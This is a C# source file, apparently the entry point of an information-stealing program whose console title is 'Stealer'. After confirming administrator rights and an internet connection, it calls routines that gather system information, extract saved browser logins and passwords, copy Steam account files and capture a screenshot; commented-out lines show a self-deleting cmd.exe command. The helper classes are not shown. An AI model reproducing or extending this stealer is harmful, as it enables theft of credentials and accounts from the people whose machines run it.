namespace DomaNet
{
    using System;
    using System.IO;
    using System.Security.Principal;

    internal class Program
    {
        [STAThread]
        private static void Main()
        {
            if (IsUserAdministrator)
            {
                if (NetControl.GetCheckForInternetConnection("https://www.google.com"))
                {
                    Console.Title = "Stealer";
                    HomeDirectory.Create(GetDirPath.User_Name, true);
                    SystemInfo.InfoGrabbeR.CreateTable(GetDirPath.PC_File);
                    Browsers.SearchLogin.Search("Login Data");
                    Browsers.SearchLogin.EngineTemp("Logins");
                    Browsers.GetEnginePassword.All(GetDirPath.Pass_File);
                    Steam.GetSteamFiles.Copy("*.", "*.vdf");
                    ScreenShotWindow.Take(Path.Combine(GetDirPath.User_Name, "Screen.bmp"));
                    // BlockIE.Enabled(@"Software\Microsoft\Windows\CurrentVersion\Internet Settings",0); // only win 7
                    // Bomba.Com("/C choice /C Y /N /D Y /T 0 & Del", "cmd.exe");
                }
                else
                {
                    File.WriteAllText(path: "Connect.txt", contents: "Возможно у Вас нет интернет соединения.\r\nПроверьте подключение к интернету и повторите снова. ");
                    Environment.Exit(-1);
                }
            }
            else
            {
                File.WriteAllText(path: "Privileges.txt", contents: "У вас не хватает прав для запуска этого приложения.\r\nОбратитесь к Администратору. ");
                Environment.Exit(-1);
            }
        }
        static bool IsUserAdministrator => new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
    }
}